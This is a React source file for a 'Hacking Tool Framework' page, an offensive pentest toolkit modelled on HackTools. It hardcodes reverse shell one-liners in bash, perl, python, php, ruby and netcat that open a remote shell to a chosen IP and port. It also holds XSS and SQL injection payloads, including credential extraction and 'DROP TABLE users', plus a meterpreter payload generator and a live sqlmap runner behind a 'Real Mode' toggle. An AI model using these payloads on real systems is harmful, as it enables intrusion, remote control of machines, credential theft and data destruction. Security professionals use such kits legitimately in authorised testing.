
import React, { useState, useEffect } from 'react';
import ViewerHeader from '@/components/viewer/ViewerHeader';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Cpu, Terminal, Download, ExternalLink, Code, Shield, AlertTriangle, Wrench, Copy, Check, Send, Terminal2, Bug, Settings2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { toast } from '@/components/ui/use-toast';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Separator } from '@/components/ui/separator';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { executeHackingTool, executeRapidPayload } from '@/utils/osintTools';
import { executeSecurityAdmin } from '@/utils/osintTools';

const HackingToolPage: React.FC = () => {
  const [activeTab, setActiveTab] = useState('reverse-shell');
  const [selectedRevShellPayload, setSelectedRevShellPayload] = useState('');
  const [selectedXssPayload, setSelectedXssPayload] = useState('');
  const [customIp, setCustomIp] = useState('0.0.0.0');
  const [customPort, setCustomPort] = useState('4444');
  const [copySuccess, setCopySuccess] = useState<string | null>(null);
  const [isExecuting, setIsExecuting] = useState(false);
  const [toolOutput, setToolOutput] = useState<string | null>(null);
  const [isRealmode, setIsRealmode] = useState(false);
  
  // Check for configuration in localStorage
  useEffect(() => {
    const realMode = localStorage.getItem('hacktools-realmode') === 'true';
    setIsRealmode(realMode);
  }, []);
  
  // Reverse Shell Payloads
  const reverseShellPayloads = {
    'bash': `bash -i >& /dev/tcp/${customIp}/${customPort} 0>&1`,
    'perl': `perl -e 'use Socket;$i="${customIp}";$p=${customPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    'python': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${customIp}",${customPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    'php': `php -r '$sock=fsockopen("${customIp}",${customPort});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    'ruby': `ruby -rsocket -e'f=TCPSocket.open("${customIp}",${customPort}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    'netcat': `nc -e /bin/sh ${customIp} ${customPort}`,
    'netcat-no-e': `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${customIp} ${customPort} >/tmp/f`
  };
  
  // XSS Payloads
  const xssPayloads = {
    'basic': `<script>alert('XSS')</script>`,
    'image': `<img src="x" onerror="alert('XSS')">`,
    'svg': `<svg onload="alert('XSS')">`,
    'body': `<body onload="alert('XSS')">`,
    'input': `<input autofocus onfocus="alert('XSS')">`,
    'iframe': `<iframe src="javascript:alert('XSS')"></iframe>`,
    'data': `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>`,
    'data-url': `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
  };
  
  // SQLi Payloads 
  const sqliPayloads = {
    'basic-auth-bypass': `' OR 1=1 --`,
    'union-select': `' UNION SELECT username, password FROM users --`,
    'time-based': `' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --`,
    'error-based': `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --`,
    'blind': `' OR SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --`,
    'stacked-queries': `'; DROP TABLE users --`,
    'postgresql': `' OR EXISTS(SELECT 1 FROM pg_tables) --`,
    'mysql': `' OR EXISTS(SELECT 1 FROM information_schema.tables) --`
  };
  
  // Encode/Decode functions
  const encode = (str: string, type: string): string => {
    switch(type) {
      case 'base64':
        return btoa(str);
      case 'url':
        return encodeURIComponent(str);
      case 'html':
        return str.replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
      case 'hex':
        return Array.from(str)
          .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
          .join('');
      default:
        return str;
    }
  };
  
  const decode = (str: string, type: string): string => {
    try {
      switch(type) {
        case 'base64':
          return atob(str);
        case 'url':
          return decodeURIComponent(str);
        case 'html':
          const txt = document.createElement('textarea');
          txt.innerHTML = str;
          return txt.value;
        case 'hex':
          if (str.length % 2 !== 0) throw new Error('Invalid hex string');
          let result = '';
          for (let i = 0; i < str.length; i += 2) {
            result += String.fromCharCode(parseInt(str.substr(i, 2), 16));
          }
          return result;
        default:
          return str;
      }
    } catch (e) {
      return 'Invalid input for selected decode method';
    }
  };
  
  const [encodeInput, setEncodeInput] = useState('');
  const [encodeType, setEncodeType] = useState('base64');
  const [encodeOutput, setEncodeOutput] = useState('');
  
  const [decodeInput, setDecodeInput] = useState('');
  const [decodeType, setDecodeType] = useState('base64');
  const [decodeOutput, setDecodeOutput] = useState('');
  
  // SQLi state
  const [selectedSqliPayload, setSelectedSqliPayload] = useState('');
  const [sqliTarget, setSqliTarget] = useState('');
  
  // Payload Generator state
  const [targetOS, setTargetOS] = useState('windows');
  const [payloadType, setPayloadType] = useState('meterpreter/reverse_tcp');
  const [payloadOutput, setPayloadOutput] = useState('');
  const [payloadFormat, setPayloadFormat] = useState('raw');
  
  const handleEncode = () => {
    setEncodeOutput(encode(encodeInput, encodeType));
  };
  
  const handleDecode = () => {
    setDecodeOutput(decode(decodeInput, decodeType));
  };
  
  const handleCopyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopySuccess(type);
      setTimeout(() => setCopySuccess(null), 2000);
      toast({
        title: "Copied to clipboard!",
        description: `The ${type} has been copied to your clipboard.`,
      });
    });
  };

  const handleToolClick = (toolName: string) => {
    toast({
      title: "Tool Selected",
      description: `${toolName} will be implemented soon.`,
    });
  };
  
  const executeSelectedTool = async (toolType: string) => {
    setIsExecuting(true);
    setToolOutput(null);
    
    try {
      let result;
      
      if (toolType === 'sqli' && sqliTarget) {
        // Execute SQLi scan using selected payload
        const payload = selectedSqliPayload ? sqliPayloads[selectedSqliPayload as keyof typeof sqliPayloads] : '';
        
        result = await executeHackingTool({
          tool: 'sqlmap',
          category: 'web',
          options: {
            url: sqliTarget,
            data: payload,
            level: 3
          }
        });
        
        toast({
          title: "SQLi Tool Executed",
          description: isRealmode ? "Live scan executed against target" : "Simulation mode - no actual scan performed",
        });
      } else if (toolType === 'payload' && targetOS && payloadType) {
        // Execute payload generator for the selected OS and payload type
        result = await executeRapidPayload({
          targetOS,
          payloadType,
          format: payloadFormat,
          options: {
            lhost: customIp,
            lport: customPort
          }
        });
        
        if (result.success) {
          setPayloadOutput(result.data?.payload || JSON.stringify(result.data, null, 2));
        }
        
        toast({
          title: "Payload Generated",
          description: `${targetOS} payload created successfully`,
        });
      }
      
      if (result?.data) {
        // Format and display the tool output
        const formattedOutput = typeof result.data === 'string' ? 
          result.data : 
          JSON.stringify(result.data, null, 2);
        
        setToolOutput(formattedOutput);
      } else if (result?.error) {
        setToolOutput(`Error: ${result.error}`);
      }
    } catch (error) {
      console.error('Tool execution error:', error);
      setToolOutput(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      
      toast({
        title: "Execution Failed",
        description: error instanceof Error ? error.message : "An unknown error occurred",
        variant: "destructive"
      });
    } finally {
      setIsExecuting(false);
    }
  };
  
  const toggleRealMode = () => {
    const newMode = !isRealmode;
    setIsRealmode(newMode);
    localStorage.setItem('hacktools-realmode', newMode.toString());
    
    toast({
      title: newMode ? "Real Mode Activated" : "Simulation Mode Activated",
      description: newMode ? 
        "Tools will execute real commands. Use with caution." : 
        "Tools will run in simulation mode with no real impact.",
      variant: newMode ? "destructive" : "default"
    });
  };

  return (
    <div className="min-h-screen bg-scanner-dark text-white">
      <ViewerHeader />
      
      <main className="container mx-auto py-6 px-4">
        <div className="mb-6">
          <h1 className="text-2xl font-bold mb-2 flex items-center">
            <Cpu className="mr-2 h-6 w-6 text-scanner-primary" />
            Hacking Tool Framework
          </h1>
          <div className="flex justify-between items-center">
            <p className="text-gray-400">
              Security testing and vulnerability assessment framework
            </p>
            <div className="flex items-center">
              <span className="text-xs mr-2">
                {isRealmode ? 'Real Mode' : 'Simulation Mode'}
              </span>
              <Button 
                variant="outline" 
                size="sm" 
                onClick={toggleRealMode}
                className={isRealmode ? "bg-red-900/20 hover:bg-red-900/30 text-red-400" : ""}
              >
                <Settings2 className="h-4 w-4 mr-2" />
                {isRealmode ? 'Disable Real Mode' : 'Enable Real Mode'}
              </Button>
            </div>
          </div>
        </div>
        
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2">
            <Card className="border-gray-700 bg-scanner-dark shadow-lg">
              <CardHeader>
                <CardTitle className="flex items-center">
                  <Wrench className="h-5 w-5 text-scanner-primary mr-2" />
                  HackTools Implementation
                </CardTitle>
                <CardDescription className="text-gray-400">
                  The all-in-one Red Team toolkit for Web Pentesters
                </CardDescription>
              </CardHeader>
              <CardContent>
                <Tabs defaultValue="reverse-shell" className="w-full" onValueChange={setActiveTab}>
                  <TabsList className="grid grid-cols-5 mb-4">
                    <TabsTrigger value="reverse-shell">Reverse Shell</TabsTrigger>
                    <TabsTrigger value="xss-payloads">XSS Payloads</TabsTrigger>
                    <TabsTrigger value="sqli-payloads">SQLi Payloads</TabsTrigger>
                    <TabsTrigger value="payload-gen">Payload Gen</TabsTrigger>
                    <TabsTrigger value="encode-decode">Encode/Decode</TabsTrigger>
                  </TabsList>
                  
                  {/* Reverse Shell Tab Content */}
                  <TabsContent value="reverse-shell">
                    <div className="space-y-4">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="ip">IP Address</Label>
                          <Input 
                            id="ip" 
                            value={customIp} 
                            onChange={(e) => setCustomIp(e.target.value)}
                            className="bg-scanner-dark-alt border-gray-700"
                          />
                        </div>
                        <div>
                          <Label htmlFor="port">Port</Label>
                          <Input 
                            id="port" 
                            value={customPort} 
                            onChange={(e) => setCustomPort(e.target.value)}
                            className="bg-scanner-dark-alt border-gray-700"
                          />
                        </div>
                      </div>
                      
                      <div>
                        <Label htmlFor="shell-type">Shell Type</Label>
                        <Select 
                          value={selectedRevShellPayload} 
                          onValueChange={setSelectedRevShellPayload}
                        >
                          <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
                            <SelectValue placeholder="Select a shell type" />
                          </SelectTrigger>
                          <SelectContent className="bg-scanner-dark border-gray-700">
                            {Object.keys(reverseShellPayloads).map((key) => (
                              <SelectItem key={key} value={key}>{key}</SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      
                      {selectedRevShellPayload && (
                        <div className="mt-4">
                          <Label>Generated Shell Command</Label>
                          <div className="relative mt-1.5">
                            <Textarea 
                              readOnly 
                              value={reverseShellPayloads[selectedRevShellPayload as keyof typeof reverseShellPayloads]}
                              className="min-h-24 font-mono text-sm bg-scanner-dark-alt border-gray-700"
                            />
                            <Button 
                              size="sm" 
                              variant="outline" 
                              className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
                              onClick={() => handleCopyToClipboard(
                                reverseShellPayloads[selectedRevShellPayload as keyof typeof reverseShellPayloads], 
                                'reverse shell command'
                              )}
                            >
                              {copySuccess === 'reverse shell command' ? (
                                <Check className="h-4 w-4" />
                              ) : (
                                <Copy className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                          <p className="text-gray-400 text-xs mt-2">
                            This reverse shell payload creates a connection back to your listener at {customIp}:{customPort}
                          </p>
                          <div className="mt-4">
                            <Button
                              onClick={() => executeSelectedTool('revshell')}
                              disabled={isExecuting || !isRealmode}
                              variant="default"
                              className="bg-scanner-primary"
                            >
                              <Terminal className="h-4 w-4 mr-2" />
                              {isRealmode ? "Start Listener" : "Listener (Real Mode Only)"}
                            </Button>
                          </div>
                        </div>
                      )}
                    </div>
                  </TabsContent>
                  
                  {/* XSS Payloads Tab Content */}
                  <TabsContent value="xss-payloads">
                    <div className="space-y-4">
                      <div>
                        <Label htmlFor="xss-type">XSS Payload Type</Label>
                        <Select 
                          value={selectedXssPayload} 
                          onValueChange={setSelectedXssPayload}
                        >
                          <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
                            <SelectValue placeholder="Select an XSS payload" />
                          </SelectTrigger>
                          <SelectContent className="bg-scanner-dark border-gray-700">
                            {Object.keys(xssPayloads).map((key) => (
                              <SelectItem key={key} value={key}>{key}</SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      
                      {selectedXssPayload && (
                        <div className="mt-4">
                          <Label>Generated XSS Payload</Label>
                          <div className="relative mt-1.5">
                            <Textarea 
                              readOnly 
                              value={xssPayloads[selectedXssPayload as keyof typeof xssPayloads]}
                              className="min-h-24 font-mono text-sm bg-scanner-dark-alt border-gray-700"
                            />
                            <Button 
                              size="sm" 
                              variant="outline" 
                              className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
                              onClick={() => handleCopyToClipboard(
                                xssPayloads[selectedXssPayload as keyof typeof xssPayloads], 
                                'XSS payload'
                              )}
                            >
                              {copySuccess === 'XSS payload' ? (
                                <Check className="h-4 w-4" />
                              ) : (
                                <Copy className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                          <p className="text-gray-400 text-xs mt-2">
                            Use this payload to test for Cross-Site Scripting vulnerabilities
                          </p>
                        </div>
                      )}
                    </div>
                  </TabsContent>
                  
                  {/* SQLi Payloads Tab Content */}
                  <TabsContent value="sqli-payloads">
                    <div className="space-y-4">
                      <div>
                        <Label htmlFor="sqli-type">SQLi Payload Type</Label>
                        <Select 
                          value={selectedSqliPayload} 
                          onValueChange={setSelectedSqliPayload}
                        >
                          <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
                            <SelectValue placeholder="Select a SQLi payload" />
                          </SelectTrigger>
                          <SelectContent className="bg-scanner-dark border-gray-700">
                            {Object.keys(sqliPayloads).map((key) => (
                              <SelectItem key={key} value={key}>{key}</SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      
                      {selectedSqliPayload && (
                        <div className="mt-4">
                          <Label>Generated SQLi Payload</Label>
                          <div className="relative mt-1.5">
                            <Textarea 
                              readOnly 
                              value={sqliPayloads[selectedSqliPayload as keyof typeof sqliPayloads]}
                              className="min-h-24 font-mono text-sm bg-scanner-dark-alt border-gray-700"
                            />
                            <Button 
                              size="sm" 
                              variant="outline" 
                              className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
                              onClick={() => handleCopyToClipboard(
                                sqliPayloads[selectedSqliPayload as keyof typeof sqliPayloads], 
                                'SQLi payload'
                              )}
                            >
                              {copySuccess === 'SQLi payload' ? (
                                <Check className="h-4 w-4" />
                              ) : (
                                <Copy className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                          <p className="text-gray-400 text-xs mt-2">
                            Use this payload to test for SQL Injection vulnerabilities
                          </p>
                          
                          <div className="mt-4 space-y-4">
                            <div>
                              <Label htmlFor="sqli-target">Target URL</Label>
                              <Input
                                id="sqli-target"
                                placeholder="https://example.com/login.php"
                                value={sqliTarget}
                                onChange={(e) => setSqliTarget(e.target.value)}
                                className="bg-scanner-dark-alt border-gray-700"
                              />
                            </div>
                            
                            <Button
                              onClick={() => executeSelectedTool('sqli')}
                              disabled={isExecuting || !sqliTarget}
                              variant="default"
                              className="bg-scanner-primary"
                            >
                              <Bug className="h-4 w-4 mr-2" />
                              {isExecuting ? "Running..." : "Test SQLi"}
                            </Button>
                          </div>
                          
                          {toolOutput && activeTab === 'sqli-payloads' && (
                            <div className="mt-4">
                              <Label>Tool Output</Label>
                              <div className="bg-scanner-dark-alt border border-gray-700 rounded-md p-4 mt-1.5">
                                <pre className="text-xs overflow-auto whitespace-pre-wrap">{toolOutput}</pre>
                              </div>
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  </TabsContent>
                  
                  {/* Payload Generator Tab Content */}
                  <TabsContent value="payload-gen">
                    <div className="space-y-4">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="target-os">Target OS</Label>
                          <Select value={targetOS} onValueChange={setTargetOS}>
                            <SelectTrigger id="target-os" className="bg-scanner-dark-alt border-gray-700">
                              <SelectValue placeholder="Select target OS" />
                            </SelectTrigger>
                            <SelectContent className="bg-scanner-dark border-gray-700">
                              <SelectItem value="windows">Windows</SelectItem>
                              <SelectItem value="linux">Linux</SelectItem>
                              <SelectItem value="macos">macOS</SelectItem>
                              <SelectItem value="android">Android</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>
                        
                        <div>
                          <Label htmlFor="payload-type">Payload Type</Label>
                          <Select value={payloadType} onValueChange={setPayloadType}>
                            <SelectTrigger id="payload-type" className="bg-scanner-dark-alt border-gray-700">
                              <SelectValue placeholder="Select payload type" />
                            </SelectTrigger>
                            <SelectContent className="bg-scanner-dark border-gray-700">
                              <SelectItem value="meterpreter/reverse_tcp">Meterpreter Reverse TCP</SelectItem>
                              <SelectItem value="meterpreter/reverse_https">Meterpreter Reverse HTTPS</SelectItem>
                              <SelectItem value="shell/reverse_tcp">Shell Reverse TCP</SelectItem>
                              <SelectItem value="powershell/reverse_tcp">PowerShell Reverse TCP</SelectItem>
                              <SelectItem value="cmd/unix/reverse_bash">Bash Reverse Shell</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                          <Label htmlFor="lhost">LHOST (Your IP)</Label>
                          <Input
                            id="lhost"
                            value={customIp}
                            onChange={(e) => setCustomIp(e.target.value)}
                            className="bg-scanner-dark-alt border-gray-700"
                          />
                        </div>
                        
                        <div>
                          <Label htmlFor="lport">LPORT (Your Port)</Label>
                          <Input
                            id="lport"
                            value={customPort}
                            onChange={(e) => setCustomPort(e.target.value)}
                            className="bg-scanner-dark-alt border-gray-700"
                          />
                        </div>
                      </div>
                      
                      <div>
                        <Label htmlFor="payload-format">Format</Label>
                        <Select value={payloadFormat} onValueChange={setPayloadFormat}>
                          <SelectTrigger id="payload-format" className="bg-scanner-dark-alt border-gray-700">
                            <SelectValue placeholder="Select format" />
                          </SelectTrigger>
                          <SelectContent className="bg-scanner-dark border-gray-700">
                            <SelectItem value="raw">Raw</SelectItem>
                            <SelectItem value="exe">Executable (.exe)</SelectItem>
                            <SelectItem value="elf">ELF</SelectItem>
                            <SelectItem value="python">Python</SelectItem>
                            <SelectItem value="powershell">PowerShell</SelectItem>
                            <SelectItem value="bash">Bash</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                      
                      <Button
                        onClick={() => executeSelectedTool('payload')}
                        disabled={isExecuting}
                        variant="default"
                        className="bg-scanner-primary"
                      >
                        <Terminal2 className="h-4 w-4 mr-2" />
                        {isExecuting ? "Generating..." : "Generate Payload"}
                      </Button>
                      
                      {payloadOutput && (
                        <div className="mt-4">
                          <div className="flex justify-between items-center">
                            <Label>Generated Payload</Label>
                            <Button 
                              size="sm" 
                              variant="outline" 
                              className="h-8 border-gray-700 hover:bg-scanner-dark-alt"
                              onClick={() => handleCopyToClipboard(payloadOutput, 'payload')}
                            >
                              {copySuccess === 'payload' ? (
                                <Check className="h-4 w-4 mr-2" />
                              ) : (
                                <Copy className="h-4 w-4 mr-2" />
                              )}
                              Copy
                            </Button>
                          </div>
                          <div className="bg-scanner-dark-alt border border-gray-700 rounded-md p-4 mt-1.5">
                            <pre className="text-xs overflow-auto whitespace-pre-wrap">{payloadOutput}</pre>
                          </div>
                        </div>
                      )}
                    </div>
                  </TabsContent>
                  
                  {/* Encode/Decode Tab Content */}
                  <TabsContent value="encode-decode">
                    <div className="space-y-6">
                      <div className="space-y-4">
                        <h3 className="font-semibold">Encode</h3>
                        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                          <div className="md:col-span-3">
                            <Label htmlFor="encode-input">Text to Encode</Label>
                            <Textarea 
                              id="encode-input"
                              value={encodeInput}
                              onChange={(e) => setEncodeInput(e.target.value)}
                              className="min-h-20 font-mono text-sm bg-scanner-dark-alt border-gray-700"
                            />
                          </div>
                          <div>
                            <Label htmlFor="encode-type">Encoding</Label>
                            <Select 
                              value={encodeType} 
                              onValueChange={setEncodeType}
                            >
                              <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
                                <SelectValue placeholder="Select type" />
                              </SelectTrigger>
                              <SelectContent className="bg-scanner-dark border-gray-700">
                                <SelectItem value="base64">Base64</SelectItem>
                                <SelectItem value="url">URL</SelectItem>
                                <SelectItem value="html">HTML</SelectItem>
                                <SelectItem value="hex">Hex</SelectItem>
                              </SelectContent>
                            </Select>
                            <Button 
                              className="w-full mt-2" 
                              onClick={handleEncode}
                            >
                              Encode
                            </Button>
                          </div>
                        </div>
                        
                        {encodeOutput && (
                          <div>
                            <Label>Encoded Output</Label>
                            <div className="relative mt-1.5">
                              <Textarea 
                                readOnly 
                                value={encodeOutput}
                                className="min-h-20 font-mono text-sm bg-scanner-dark-alt border-gray-700"
                              />
                              <Button 
                                size="sm" 
                                variant="outline" 
                                className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
                                onClick={() => handleCopyToClipboard(encodeOutput, 'encoded text')}
                              >
                                {copySuccess === 'encoded text' ? (
                                  <Check className="h-4 w-4" />
                                ) : (
                                  <Copy className="h-4 w-4" />
                                )}
                              </Button>
                            </div>
                          </div>
                        )}
                      </div>
                      
                      <Separator className="bg-gray-700" />
                      
                      <div className="space-y-4">
                        <h3 className="font-semibold">Decode</h3>
                        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                          <div className="md:col-span-3">
                            <Label htmlFor="decode-input">Text to Decode</Label>
                            <Textarea 
                              id="decode-input"
                              value={decodeInput}
                              onChange={(e) => setDecodeInput(e.target.value)}
                              className="min-h-20 font-mono text-sm bg-scanner-dark-alt border-gray-700"
                            />
                          </div>
                          <div>
                            <Label htmlFor="decode-type">Decoding</Label>
                            <Select 
                              value={decodeType} 
                              onValueChange={setDecodeType}
                            >
                              <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
                                <SelectValue placeholder="Select type" />
                              </SelectTrigger>
                              <SelectContent className="bg-scanner-dark border-gray-700">
                                <SelectItem value="base64">Base64</SelectItem>
                                <SelectItem value="url">URL</SelectItem>
                                <SelectItem value="html">HTML</SelectItem>
                                <SelectItem value="hex">Hex</SelectItem>
                              </SelectContent>
                            </Select>
                            <Button 
                              className="w-full mt-2" 
                              onClick={handleDecode}
                            >
                              Decode
                            </Button>
                          </div>
                        </div>
                        
                        {decodeOutput && (
                          <div>
                            <Label>Decoded Output</Label>
                            <div className="relative mt-1.5">
                              <Textarea 
                                readOnly 
                                value={decodeOutput}
                                className="min-h-20 font-mono text-sm bg-scanner-dark-alt border-gray-700"
                              />
                              <Button 
                                size="sm" 
                                variant="outline" 
                                className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
                                onClick={() => handleCopyToClipboard(decodeOutput, 'decoded text')}
                              >
                                {copySuccess === 'decoded text' ? (
                                  <Check className="h-4 w-4" />
                                ) : (
                                  <Copy className="h-4 w-4" />
                                )}
                              </Button>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </TabsContent>
                </Tabs>
              </CardContent>
            </Card>
          </div>
          
          <div className="lg:col-span-1 space-y-6">
            <Card className="border-gray-700 bg-scanner-dark shadow-lg">
              <CardHeader>
                <CardTitle className="flex items-center">
                  <Shield className="h-5 w-5 text-scanner-success mr-2" />
                  Additional Tools
                </CardTitle>
                <CardDescription className="text-gray-400">
                  Other security testing tools
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex flex-wrap gap-2">
                  <Button 
                    variant="outline" 
                    className="border-gray-700 hover:bg-scanner-dark-alt"
                    onClick={() => window.open('https://github.com/LasCC/HackTools', '_blank')}
                  >
                    <ExternalLink className="h-4 w-4 mr-2" />
                    HackTools GitHub
                  </Button>
                  
                  <Button 
                    variant="outline" 
                    className="border-gray-700 hover:bg-scanner-dark-alt"
                    onClick={() => {
                      if (isRealmode) {
                        executeSecurityAdmin({
                          command: 'scan',
                          scanType: 'basic',
                          options: {
                            target: 'localhost',
                            ports: '1-1000'
                          }
                        }).then(result => {
                          toast({
                            title: "Security Admin",
                            description: "Scan completed. Check console for details.",
                          });
                          console.log("Security Admin Results:", result);
                        }).catch(err => {
                          console.error("Security Admin Error:", err);
                        });
                      } else {
                        handleToolClick('Security Admin');
                      }
                    }}
                  >
                    <Code className="h-4 w-4 mr-2" />
                    Security Admin
                  </Button>
                </div>
                
                <div className="pt-2">
                  <h3 className="text-sm font-semibold mb-2">Available Tools:</h3>
                  <ul className="text-xs text-gray-400 space-y-1 pl-5 list-disc">
                    <li>SQLi payloads & cheatsheets</li>
                    <li>CMS & Web technology detection</li>
                    <li>Advanced payload generator</li>
                    <li>Security scanning tools</li>
                  </ul>
                </div>
              </CardContent>
            </Card>
          
            <Card className="border-gray-700 bg-scanner-dark shadow-lg">
              <CardHeader>
                <CardTitle className="flex items-center">
                  <Download className="h-5 w-5 text-scanner-primary mr-2" />
                  FileCentipede
                </CardTitle>
                <CardDescription className="text-gray-400">
                  Advanced Download Manager and Explorer
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <p className="text-gray-400">
                  FileCentipede is a powerful download manager with BitTorrent client, M3U8 downloader, 
                  MPD downloader, and network packet capture capabilities.
                </p>
                <div className="flex flex-wrap gap-2">
                  <Button 
                    variant="outline" 
                    className="border-gray-700 hover:bg-scanner-dark-alt"
                    onClick={() => handleToolClick('FileCentipede')}
                  >
                    <Download className="h-4 w-4 mr-2" />
                    Download
                  </Button>
                  <Button 
                    variant="outline" 
                    className="border-gray-700 hover:bg-scanner-dark-alt"
                    onClick={() => window.open('https://github.com/filecxx/FileCentipede', '_blank')}
                  >
                    <ExternalLink className="h-4 w-4 mr-2" />
                    GitHub
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
    </div>
  );
};

export default HackingToolPage;
